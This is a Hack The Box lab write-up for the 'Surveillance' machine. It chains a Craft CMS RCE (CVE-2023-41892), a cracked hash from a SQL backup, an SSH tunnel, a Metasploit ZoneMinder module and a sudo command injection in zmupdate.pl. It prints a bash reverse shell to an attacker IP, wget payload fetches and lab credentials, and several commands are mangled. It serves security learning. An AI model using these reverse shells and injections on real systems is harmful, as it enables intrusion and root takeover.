---
description: >-
  HTB — Surveillance Writeup Difficulty: Medium OS: Linux (Ubuntu 22.04) Attack
  Path: Nmap → Craft CMS RCE (CVE-2023-41892) → SQL Backup → Hash Crack → SSH as
  matthew → SSH Tunnel → ZoneMinder Login → M
---

# Surveillance

### Overview

Surveillance is a medium Linux machine built around two separate exploitation chains. First, we exploit a Craft CMS Remote Code Execution vulnerability (CVE-2023-41892) to get a shell as www-data. Inside the app we find a database backup with a hashed admin password — crack it and SSH in as matthew. Then we discover an internal ZoneMinder service running on port 8080. Tunnel into it, exploit another RCE via Metasploit (ZoneMinder Snapshots module), land a shell as the zoneminder user, and finally abuse a misconfigured sudo rule on zmupdate.pl to pop root.

### Enumeration

#### /etc/hosts Setup

![/etc/hosts — surveillance.htb added at 10.10.11.245](<../../.gitbook/assets/Unknown image (317)>)

Add surveillance.htb to /etc/host

&#x20;`echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts`

#### Nmap Scan

&#x20;`nmap -sV -T4 -O -F --version-light 10.10.11.245`

![Nmap — Port 22 SSH and Port 80 HTTP (nginx 1.18.0)](<../../.gitbook/assets/Unknown image (318)>)

**Open Ports:**

| Port | Service | Version               |
| ---- | ------- | --------------------- |
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu  |
| 80   | HTTP    | nginx 1.18.0 (Ubuntu) |

Only two ports. The web server is the main target.

***

### Web Enumeration

#### Website

![surveillance.htb — Home Security themed website running Craft CMS](<../../.gitbook/assets/Unknown image (319)>)

The website is a "Home Security" company themed page. Check the source and footer — it reveals **Craft CMS**. The admin panel is usually at /admin/login.

#### Directory Brute Force — Dirsearch

`dirsearch -u http://surveillance.htb/`

![Dirsearch — /admin/login Found (Craft CMS)](<../../.gitbook/assets/Unknown image (320)>)

Key finding: /admin/login — confirmed Craft CMS admin panel.

#### Craft CMS Admin Login

![Craft CMS Admin Login Page at surveillance.htb/admin/login](<../../.gitbook/assets/Unknown image (321)>)

The version of Craft CMS is visible in the page source — **Craft CMS 4.4.14**. This version is vulnerable to **CVE-2023-41892** — an unauthenticated Remote Code Execution.

***

### Initial Access — CVE-2023-41892 (Craft CMS RCE)

#### The Vulnerability

CVE-2023-41892 affects Craft CMS versions before 4.4.15. It allows unauthenticated RCE through the GQL (GraphQL) endpoint by exploiting a PHP object injection chain that writes a webshell to the filesystem via Imagick.

![GitHub Gist — CVE-2023-41892 POC by to016](<../../.gitbook/assets/Unknown image (322)>)



## Set up a listener first

nc -lvnp 8989

## Then run the exploit

python3 exp2.py http://surveillance.htb/ 10.10.14.71 8989 \`

![exp2.py Running — Gets temp folder, writes payload, triggers Imagick](<../../.gitbook/assets/Unknown image (323)>)

The script:

1. Gets the temp folder and document root from Craft CMS
2. Writes a PHP payload to the temp folder
3. Uses Imagick to trigger execution and write a web shell
4. Executes a reverse shell command

![Reverse Shell Caught — www-data uid=33 on surveillance.htb](<../../.gitbook/assets/Unknown image (324)>)

Shell caught as **www-data**. Upgrade to a proper TTY:

&#x20;`python3 -c 'import pty;pty.spawn("/bin/bash")'`

### Post-Exploitation — Finding the Database Backup

Explore the web application's storage directory:

&#x20;`ls ~/html/craft/web/cpresources`

![cpresources Directory Listing — Craft CMS Storage Files](<../../.gitbook/assets/Unknown image (325)>)

Navigate to the backups folder:

`ash cd ~/html/craft/storage/backups ls`

![Backups Folder — surveillance--2023-10-17-202801--v4.4.14.sql.zip Found](<../../.gitbook/assets/Unknown image (326)>)

Found a SQL backup ZIP file: surveillance--2023-10-17-202801--v4.4.14.sql.zip

Serve it via HTTP and download it:

\` python3 -m http.server 8000

## On kali:

wget http://10.10.11.245:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip \`

### Cracking the Admin Hash

Unzip and open the SQL file. Search for the users table:

![SQL Backup — Admin User Insert with SHA256 Hash](<../../.gitbook/assets/Unknown image (327)>)

Found the admin user record:

`admin@surveillance.htb Hash: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec`

It's a **SHA-256** hash. Submit it to an online cracker (crackstation.net):

![CrackStation — Hash Cracked: starcraft122490](<../../.gitbook/assets/Unknown image (328)>)

**Password: starcraft122490**

### User Shell — SSH as matthew

The Craft CMS admin account email was dmin@surveillance.htb. Try the cracked password with system users. Check /etc/passwd — there's a user matthew:

\`ash ssh matthew@10.10.11.245

## Password: starcraft122490

\`

![SSH Login as matthew — Ubuntu 22.04.3 LTS](<../../.gitbook/assets/Unknown image (329)>) ![matthew@surveillance — cat user.txt — Flag Captured](<../../.gitbook/assets/Unknown image (330)>)

Got user! Read user.txt from matthew's home directory.

Check sudo rights:

![sudo -l — matthew has NO sudo rights on surveillance](<../../.gitbook/assets/Unknown image (331)>)

Matthew can't run sudo at all. Time to look for lateral movement or another service.

### Lateral Movement — Internal ZoneMinder (Port 8080)

#### SSH Port Forward

There's an internal service running on port 8080 (found via etstat or ss). Tunnel it to our Kali:

`ash ssh -L 8080:127.0.0.1:8080 matthew@10.10.11.245`

![SSH Tunnel — Port 8080 Forwarded + ZoneMinder Login Page Visible](<../../.gitbook/assets/Unknown image (332)>)

Browse to http://127.0.0.1:8080 — it's a **ZoneMinder** login panel!

![ZoneMinder Login Page at 127.0.0.1:8080](<../../.gitbook/assets/Unknown image (333)>)

ZoneMinder is a Linux CCTV/surveillance software. Try the default credentials or the cracked password. The password ZoneMinderPassword2023 works (found later in config files).

### Foothold as zoneminder — Metasploit ZoneMinder Snapshots RCE

Install Metasploit if needed:

`ash sudo apt update; sudo apt install metasploit-framework`

![Installing Metasploit Framework via apt](<../../.gitbook/assets/Unknown image (334)>)

#### The Module

`use unix/webapp/zoneminder_snapshots`

![Metasploit — ZoneMinder Snapshots Command Injection Module Info](<../../.gitbook/assets/Unknown image (335)>)

This module exploits a command injection in ZoneMinder's snapshot functionality. No authentication bypass needed — we log in with ZoneMinder credentials.

#### Configure and Run

&#x20;`set rport 8080 set RHOSTS 127.0.0.1 set SRVPORT 8081 set AutoCheck false run`

![Metasploit Options Set — rport 8080, RHOSTS 127.0.0.1, AutoCheck false](<../../.gitbook/assets/Unknown image (336)>)

The module fetches the CSRF token, injects the command, and sends a reverse meterpreter payload.

`meterpreter > shell`

![Meterpreter Shell — uid=1001(zoneminder) gid=1001(zoneminder)](<../../.gitbook/assets/Unknown image (337)>)

We now have a shell as the **zoneminder** user!

Check sudo:

`sudo -l User zoneminder may run the following commands on surveillance: (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *`

ZoneMinder user can run any zm\*.pl script as root with no password. This is the privesc path.

### Privilege Escalation — zmupdate.pl Injection

#### Finding the Database Password

First we need the ZoneMinder database password. Find it in the config:

&#x20;`grep --color=always -rnw . -ie "PASSWORD" 2>/dev/null`

![ZoneMinder Config — ZM\_DB\_PASS=ZoneMinderPassword2023](<../../.gitbook/assets/Unknown image (338)>)

Found: `ZM_DB_HOST=localhost ZM_DB_NAME=zm ZM_DB_USER=zmuser ZM_DB_PASS=ZoneMinderPassword2023`

![grep showing ZoneMinderPassword2023 in mariadb-setpermission script](<../../.gitbook/assets/Unknown image (339)>)

#### The zmupdate.pl Exploit

zmupdate.pl is a ZoneMinder script that upgrades the database. The --user parameter is passed unsanitized directly into a shell command:

`mysql -u -p'ZoneMinderPassword2023' ...`

The --user argument is wrapped in $() — **command substitution**. So we can inject any command here and it runs as root!

**Step 1:** Create a reverse shell script on our Kali:

&#x20;`nano shelll.sh`

## Content:

`"#!/bin/bash bash -c "bash -i >& /dev/tcp/10.10.14.71/4444 0<&1"`

**Step 2:** Serve it and download on target:

## Kali - serve it

python3 -m http.server 4443

## Target - download

wget http://10.10.14.71:4443/shelll.sh \`

![Kali Serving shelll.sh on port 4443 — Request From 10.10.11.245](<../../.gitbook/assets/Unknown image (340)>) ![Target — shelll.sh Downloaded to /tmp, ls shows the file](<../../.gitbook/assets/Unknown image (341)>)

**Step 3:** Move to /tmp and make it executable, then set up listener and exploit:

\`ash

## Move the shell

ls -la /tmp chmod +x /var/tmp/shelll.sh \`

![/tmp Contents — shelll.sh visible, chmod +x applied](<../../.gitbook/assets/Unknown image (342)>)

**Step 4:** Run zmupdate.pl with the payload injected into --user:

`ash sudo /usr/bin/zmupdate.pl --version=1 --user='' --pass=ZoneMinderPassword2023`

![zmupdate.pl Running — Initiating database upgrade, command injected](<../../.gitbook/assets/Unknown image (343)>)

The script runs and hits our shell command inside the $() substitution.

![zmupdate.pl — Running with /tmp/shelll.sh in user field](<../../.gitbook/assets/Unknown image (344)>)

**Step 5:** On our listener — root shell received:

`ash nc -lvnp 4444`

![root@surveillance — cat /root/root.txt — Flag Captured!](<../../.gitbook/assets/Unknown image (345)>)

**Root!** Read the flag:

`ash locate root.txt cat /root/root.txt`

### Summary

| Step           | Detail                                   |
| -------------- | ---------------------------------------- |
| Nmap           | Port 22 + 80, nginx on Ubuntu            |
| Web            | Craft CMS 4.4.14 at surveillance.htb     |
| CVE-2023-41892 | Unauthenticated RCE → www-data shell     |
| SQL Backup     | Found in Craft CMS storage/backups       |
| Hash Crack     | SHA256 39ed84b... → starcraft122490      |
| SSH            | matthew@surveillance.htb                 |
| Port Forward   | SSH tunnel port 8080 → ZoneMinder        |
| MSF Module     | zoneminder\_snapshots → zoneminder shell |
| Config         | ZM\_DB\_PASS=ZoneMinderPassword2023      |
| Privesc        | sudo zmupdate.pl --user='' → root        |

### Key Takeaways

* **CVE-2023-41892** (Craft CMS) is a powerful unauth RCE — always check CMS version in page source
* **Backup files expose sensitive data** — the SQL backup had the admin password hash
* **SHA-256 hashes can often be cracked** on public databases like crackstation
* **Internal services matter** — ZoneMinder was only on localhost but accessible via SSH tunnel
* **ZoneMinder Snapshots CVE** is a great example of command injection in admin tooling
* **sudo wildcard rules are dangerous** — zm\[a-zA-Z]\*.pl \* allows any argument including $(command)
* **Command substitution in shell arguments** is a classic privesc when scripts pass user input unsanitized to shell commands

&#x20;_Platform: Hack The Box_
